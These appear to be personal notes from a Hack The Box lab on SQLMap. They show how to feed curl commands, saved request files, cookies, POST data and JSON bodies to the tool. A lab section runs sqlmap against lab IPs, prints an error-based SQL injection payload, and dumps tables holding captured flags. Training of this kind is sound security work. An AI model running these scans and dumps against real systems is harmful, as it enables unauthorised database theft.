# Running SQLMap on an HTTP Request

## Curl Commands

On Browser :  Copy as cURL

-> Changing cURL by sqlmap

sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'

GET :
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

POST :
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

## Full HTTP Requests

Captured from within a specialized proxy application

write to a request file > req.txt

GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0

sqlmap -r req.txt

## Custom SQLMap Requests

sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

Specify method :
sqlmap -u www.target.com --data='id=1' --method PUT

## Custom HTTP Requests

cat req.txt

HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}

sqlmap -r req.txt

## LAB

### POST PARAMETER

sqlmap -u 'http://94.237.62.195:56120/case2.php' --data 'id=1' 

[10:26:15] [INFO] POST parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Rice")

id=1 AND (SELECT 3224 FROM(SELECT COUNT(*),CONCAT(0x716b786b71,(SELECT (ELT(3224=3224,1))),0x717a766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

sqlmap -u 'http://94.237.62.195:56120/case2.php' --data 'id=1' --batch --dump-all

sqlmap -u 'http://94.237.62.195:56120/case2.php' --data 'id=1' --batch --dump flag2

Database: testdb
Table: flag2
[1 entry]
+----+----------------------------------------+
| id | content                                |
+----+----------------------------------------+
| 1  | HTB{700_much_c0n6r475_0n_p057_r3qu357} |
+----+----------------------------------------+

### COOKIE VALUE

sqlmap -u 'http://94.237.62.195:56120/case3.php' --cookie='id=1' --batch --dump flag3

sqlmap -u 'http://94.237.62.195:56120/case3.php' -H='Cookie:id=1' --batch --dump flag3

--> Failed

sqlmap -u 'http://94.237.62.195:56120/case3.php' --cookie "id=*" --batch --dump flag3

cat /home/htb-ac-786011/.local/share/sqlmap/output/94.237.62.195/dump/testdb/flag3.csv

id,content
1,HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}

### JSON VALUE

POST /case4.php HTTP/1.1
Host: 94.237.62.195:56120
Content-Length: 8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://94.237.62.195:56120
Referer: http://94.237.62.195:56120/case4.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{"id":1}

cat req.txt

POST /case4.php HTTP/1.1
Host: 94.237.62.195:56120
Content-Length: 8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://94.237.62.195:56120
Referer: http://94.237.62.195:56120/case4.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{"id":1}

sqlmap -r req.txt --batch --dump flag4

cat /home/htb-ac-786011/.local/share/sqlmap/output/94.237.62.195/dump/testdb/flag4.csv

id,content
1,HTB{j450n_v00rh335_53nd5_6r475}
